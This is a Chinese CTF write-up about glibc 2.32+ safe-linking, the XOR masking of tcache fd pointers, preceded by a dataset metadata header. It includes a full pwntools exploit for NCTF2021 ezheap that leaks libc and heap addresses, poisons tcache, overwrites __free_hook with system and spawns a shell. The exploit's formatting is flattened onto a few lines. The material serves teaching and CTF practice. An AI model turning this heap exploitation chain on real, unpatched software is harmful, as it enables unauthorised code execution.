---
title: glibc 高版本堆题攻击之 safe unlink
contest: ctf-share
year: 2022
difficulty: hard
vuln_type: pwn_unknown
tags:
- glibc-2.32
- glibc-2.33
- safe-linking
- tcache
- fastbin
- fd-xor
- uxor
- uaf
attack_chain:
- 识别 safe-linking 异或密钥 (pos >> 12) ^ ptr
- 填满 tcache 触发 unsorted bin
- 泄 libc + heap 地址
- 计算密钥 key = heap >> 12
- 改 tcache fd 为 (free_hook ^ key)
- 申请覆盖 __free_hook = system
- 触发 free("/bin/sh")
key_payload: safe-linking 异或密钥 + tcache fd 攻击
one_liner: glibc 2.32+ 堆利用：safe-linking 机制 + tcache fd 异或攻击。
lesson: glibc 2.32+ 的 safe-linking 机制本质是 tcache/fastbin fd 的 12-bit ASLR 异或保护。
quality: high
full_path: glibc高版本堆题攻击之safe_unlink.full.md
meta_path: glibc高版本堆题攻击之safe_unlink.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: glibc 高版本堆题攻击之 safe unlink。glibc 2.32+ 堆利用：safe-linking 机制 + tcache fd 异或攻击。。关键路径：识别 safe-linking 异或密钥 (pos >> 12) ^ ptr → 填满 tcache 触发 unsorted bin → 泄 libc + heap 地址。经验：glibc 2.32+ 的 safe-linking...
category: pwn
subcategory: pwn_other
time_required: long
difficulty_score: 4
code_blocks_count: 0
images_count: 10
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/65732.html
reasoning_chain:
- 触发点：glibc 2.32+ tcache/fastbin 加入 safe-linking 机制 → 假设：fd 指针异或 (pos>>12) ^ ptr
- 动作：free chunk → 观察：fd 显示为 0x562e784a3，低版本下应该是 0x562e784a3000 → 触发点：12-bit ASLR 异或
- 假设：密文 fd ^ key = 原始 fd → 动作：先泄 heap 地址算出 key → 下一步：用 key 异或伪造 fd
- '加密函数 #define PROTECT_PTR(pos, ptr) ((pos) >> 12) ^ ptr → 解密 REVEAL_PTR(ptr) PROTECT_PTR(&ptr, ptr)'
- 模板题 ezheap：增删改查 + UAF（size 清空但指针未清）→ 假设：add free add 可放两个相同指针
- 动作：free 两次后 tcache 头是 fd 异或 → 假设：覆盖 fd 指向 fake chunk → 触发 0x70 tcache 取 chunk
- 下一步：构造 fake chunk 触发 __free_hook 写入 → system('/bin/sh')
failed_attempts:
- 试图不解密 fd 直接覆盖 → 失败：glibc 2.32+ safe-linking 异或保护
- 试图填满 tcache 直接取 → 失败：必须算 key 才能伪造下一节点
- 试图用 fastbin 替代 tcache → 失败：题目已用 tcache 模式
key_observations:
- glibc 2.32+ safe-linking 本质是 tcache/fastbin fd 的 12-bit ASLR 异或保护
- 泄 heap 地址 → key = heap>>12 → 解密 fd 是标准流程
- safe-linking 不影响链表遍历逻辑，只是单次解密的额外步骤
- __free_hook 在 glibc 2.34+ 已移除，glibc 2.32-2.33 仍可攻击
prerequisites:
- glibc heap 机制（tcache / fastbin / unsorted bin）
- safe-linking 异或原理 (PROTECT_PTR / REVEAL_PTR 宏)
- fake chunk 构造
- GDB + heap 调试
---
# glibc高版本堆题攻击之safe unlink

> 原文: https://www.ctfiot.com/65732.html
> ID: 65732

本文为看雪论坛优秀文章

看雪论坛作者ID：Nameless_a

测试版本2.33_5

从2.32版本开始，tcache和fastbin里面就加入了一个safe unlink的机制，主要是对fd指针的一个异或操作来使得不那么好利用UAF等需要fd指针的手法进行地址泄露以及进一步的任意地址写。

具体的效果如下：

发现fd指针的值为0x562e784a3，如果是低版本的话，应该是0x562e784a3000也就是上一个堆块的地址。可以看出fd指针被加密了。

那么是怎么加密的呢，我们看看源码：

/* Safe-Linking: Use randomness from ASLR (mmap_base) to protect single-linked lists of Fast-Bins and TCache. That is, mask the "next" pointers of the lists' chunks, and also perform allocation alignment checks on them. This mechanism reduces the risk of pointer hijacking, as was done with Safe-Unlinking in the double-linked lists of Small-Bins. It assumes a minimum page size of 4096 bytes (12 bits). Systems with larger pages provide less entropy, although the pointer mangling still works. *//* 加密函数 */#define PROTECT_PTR(pos, ptr) ((__typeof (ptr)) ((((size_t) pos) >> 12) ^ ((size_t) ptr)))/* 解密函数 */#define REVEAL_PTR(ptr) PROTECT_PTR (&ptr, ptr)

pos是我们当前的堆块的fd指针的地址，ptr是未加密的时候fd指针应该指向的堆地址（也就是前一个被放进tcache的堆块的fd指针的位置）。

说通俗一点，当堆块P被free的时候，P的fd要放前一个堆块的ptr（tcache里面放的就直接是fd指针的位置了）。而放置的时候，会把&P->fd这个堆地址右移三位，当作一个密钥，来异或ptr这个明文，最后在把得到的密文放在P->这个位置。

我们再多放进tcache一个堆块测试一下：

没问题。那么解密过程又是怎么的呢？我们这里演草一下，就很清晰明了了：

结论就是，密文异或密钥就得到明文了（这里感谢二进制密码爷hash_hash师傅https://hash-hash.github.io/的指点）。

模板题：【NCTF2021】ezheap

版本

同测试版本

保护

ida

很常见的菜单题，实现了增删改查，然后删的时候有个UAF：

不过并没有完全UAF，没有清空指针，但是因为清空了size数组上对应的值，不能再edit了。但是我们可以通过在note段放两个相同的堆指针（因为没有清空，add free add就好了），free那个被清空size的idx，然后就能通过另一个idx对bin中的堆块进行修改了，就可以通过edit将它的fd指针设置为(__free_hook ^ (pos>>3))实现tcache poison然后get shell。

exp
from pwn import *from hashlib import sha256import base64context.log_level='debug'#context.arch = 'amd64'context.arch = 'amd64'context.os = 'linux' def z(): gdb.attach(r) def cho(num): r.sendafter(">> ",str(num)) def add(size,con): cho(1) r.sendafter("Size: ",str(size)) r.sendafter("Content: ",con) def edit(idx,con): cho(2) r.sendafter("Index: ",str(idx)) r.sendafter("Content: ",con) def delet(idx): cho(3) r.sendafter("Index: ",str(idx)) def show(idx): cho(4) r.sendafter("Index: ",str(idx)) def exp(): global r global libc libc=ELF('./libc-2.33.so') r=process('./ezheap') ##[+]:
leak libc && heap for i in range(0,8): add(0x80,'nameless') for i in range(1,8): delet(i) ##z() delet(0) show(1) heap=u64(r.recv(5).ljust(8,'x00')) key=heap heap<<=12 log.success('heap:'+hex(heap)) show(0) libcbase=u64(r.recvuntil('x7f')[-6:].ljust(8,'x00'))-0x1e0c00 log.success('libcbase:'+hex(libcbase)) ##[+]:
set libc_func one=[0xe3b2e,0xe3b31,0xe3b34] free_hook=libcbase+libc.sym['__free_hook'] system=libcbase+libc.sym['system'] ##onegadget=libcbase+one[0] ##UAF && poison to get shell cry_free_hook=(free_hook)^key add(0x80,'nameless') delet(7) edit(8,p64(cry_free_hook)+'n') add(0x80,'/bin/shx00') ##9 add(0x80,p64(system)) delet(9) r.interactive() if __name__ == '__main__': exp()

参考博客

2021 NCTF ezheap Writeup (glibc2.32 以上 UAF) | SkYe231 Blog (mrskye.cn)

https://www.mrskye.cn/archives/16cb363f/#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90

看雪ID：Nameless_a

https://bbs.pediy.com/user-home-943085.htm

*本文由看雪论坛 Nameless_a 原创，转载请注明来自看雪社区

峰会官网：https://meet.kanxue.com/kxmeet-6.htm

# 往期推荐

1.进程 Dump & PE unpacking & IAT 修复 – Windows 篇

2.NtSocket的稳定实现，Client与Server的简单封装，以及SocketAsyncSelect的一种APC实现

3.如何保护自己的代码？给自己的代码添加NoChange属性

4.针对某会议软件，简单研究其CEF框架

5.PE加载过程 FileBuffer-ImageBuffer

6.APT 双尾蝎样本分析

球分享

球点赞

球在看

点击“阅读原文”，了解更多！

原文始发于微信公众号（看雪学苑）：glibc高版本堆题攻击之safe unlink

---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]